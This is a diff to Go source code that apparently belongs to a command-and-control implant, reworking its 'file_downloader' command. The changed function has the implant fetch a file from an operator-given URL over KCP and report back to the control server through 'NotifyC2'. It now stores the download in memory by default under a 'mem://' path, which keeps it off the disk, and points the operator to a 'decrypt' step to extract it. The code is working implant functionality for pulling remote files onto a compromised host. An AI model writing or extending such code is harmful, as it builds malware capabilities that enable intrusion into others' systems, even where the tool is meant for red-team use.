@@ -398,20 +398,34 @@ func runFileServer(cmd *cobra.Command, args []string) {
 
 // runFileDownloader implements !file_downloader --download_addr <url> --path <path> --checksum <checksum>
 func runFileDownloader(cmd *cobra.Command, args []string) {
-	url, _ := cmd.Flags().GetString("download_addr")
+	urlStr, _ := cmd.Flags().GetString("download_addr")
 	path, _ := cmd.Flags().GetString("path")
 	checksum, _ := cmd.Flags().GetString("checksum")
-	if url == "" || path == "" {
-		c2transport.NotifyC2(cmd, "Error: args error\n")
+	if urlStr == "" {
+		c2transport.NotifyC2(cmd, "Error: download_addr (url) is required\n")
 		return
 	}
-	downloadPath := fmt.Sprintf("%s/%s", os.TempDir(), util.FileBaseName(path))
-	err := c2transport.FetchFileKCP(url, path, downloadPath, checksum)
+
+	// Default path to mem:///<filename> if omitted
+	filename := util.FileBaseName(urlStr)
+	if filename == "" {
+		filename = "downloaded_file"
+	}
+	if path == "" {
+		path = fmt.Sprintf("mem:///%s", filename)
+	}
+
+	err := c2transport.FetchFileKCP(urlStr, filename, path, checksum)
 	if err != nil {
 		c2transport.NotifyC2(cmd, "Error: %v\n", err)
 		return
 	}
-	c2transport.NotifyC2(cmd, "File downloaded to %s\n", path)
+
+	if strings.HasPrefix(path, "mem://") {
+		c2transport.NotifyC2(cmd, "File downloaded to %s. Use 'decrypt -p %s' to extract it to disk.\n", path, path)
+	} else {
+		c2transport.NotifyC2(cmd, "File downloaded to %s\n", path)
+	}
 }
 
 // getMemFileCompletions works as ls completion
